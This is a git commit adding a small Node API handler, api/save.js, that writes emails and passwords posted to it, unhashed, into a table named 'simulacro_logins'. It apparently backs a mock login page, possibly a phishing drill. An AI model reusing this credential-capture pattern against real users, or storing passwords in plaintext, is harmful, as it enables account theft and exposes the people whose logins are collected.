8f6346e65b9df3f4c192d4c9f778a3e1d3fed5f0
softwareamizf <softwareamizf@gmail.com>
2025-07-14 11:11:31 -0500

    First

---
+++ api/save.js
@@ -0,0 +1,27 @@
+import { Client } from "pg";
+
+export default async function handler(req, res) {
+  if (req.method === "POST") {
+    const { email, password } = req.body;
+
+    const client = new Client({
+      user: process.env.DB_USER,
+      host: process.env.DB_HOST,
+      database: process.env.DB_NAME,
+      password: process.env.DB_PASS,
+      port: process.env.DB_PORT,
+    });
+
+    try {
+      await client.connect();
+      await client.query("INSERT INTO simulacro_logins(email, password) VALUES($1, $2)", [email, password]);
+      await client.end();
+      res.status(200).json({ message: "Guardado correctamente" });
+    } catch (err) {
+      console.error(err);
+      res.status(500).json({ message: "Error guardando los datos" });
+    }
+  } else {
+    res.status(405).json({ message: "Method not allowed" });
+  }
+}
